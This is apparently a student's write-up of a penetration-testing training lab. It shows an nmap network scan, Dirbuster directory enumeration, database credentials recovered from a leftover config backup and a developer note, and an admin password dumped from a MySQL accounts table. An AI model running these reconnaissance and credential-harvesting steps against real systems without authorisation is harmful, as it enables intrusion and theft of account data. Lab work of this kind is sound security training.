#Dirbuster Lab

Description

You are a Penetration Tester hired by the company AwdMgmt to perform security tests on their internal Web Application and machines. You are asked to perform the penetration test on the client premises. During this engagement you are not given a well-defined scope. You are sitting in the client corporate building, 
directly attached to the client network.

Goal

The goal of this lab is to first find the web servers in the network you are directly attached. Then to test the Web Application running on it in order to check if you can access restricted areas (such as the login page)!

Tools

- Dirbuster
- mysql
- web browser

Steps:
Find all the machines in the network
`sudo nmap -sn 10.104.11.50/24`
Discovered three hosts.
10.104.11.96, 10.104.11.198, 10.104.11.50
`sudo nmap -sV -sS 10.104.11.96,198,50`
This scan took forever. 

```
Nmap scan report for 10.104.11.96
Host is up (0.036s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
MAC Address: 00:50:56:8E:65:25 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.104.11.198
Host is up (0.036s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
3306/tcp open  mysql   MySQL 5.5.38-0+wheezy1
MAC Address: 00:50:56:8E:D1:20 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Apache web server on 10.104.11.96 with open SSH
MySQL database on 10.104.11.198 with open SSH

Directory enumeration of web browser. 
dirbuster with URL. medium.txt wordlists. and the file extensions php,txt,bak,xxx,old
Access to login page...

Discovered database password in a hidden file.
`http://10.104.11.96/include/config.old` 

dbhostname=127.0.0.1
dbuser='awd'
dbpassword=UcuicjsQgG0FILdjdL8D
dbname=awd
Invalid credentials:
mysql -u awd -pUcuicjsQgG0FILdjdL8D -h 10.104.11.198

IN URL: go to /signup.php
```
TODO: Sign-up page

@Dev team: the DB credentials are
    Username:   awdmgmt
    Password:   UChxKQk96dVtM07
    Host:       10.104.11.198
    DB:         awdmgmt_accounts
    DMBS:       MySQL

To test the credentials you can use mysql via command line (Windows, Linux, Mac):
    example: mysql -u USERNAME -pPASSWORD -h HOST DB

Best regards
    IT TEAM
```

These creds logged us in
`mysql -u awdmgmt -pUChxKQk96dVtM07 -h 10.104.11.198`

Logged in:
`mysql> use awdmgmt_accounts;`
`mysql> show tables;`
`mysql> select * from accounts;`
Got credentials:
Admin:ENS7VvW8
Email: admin@awdmgmt.labs

Successful log in.

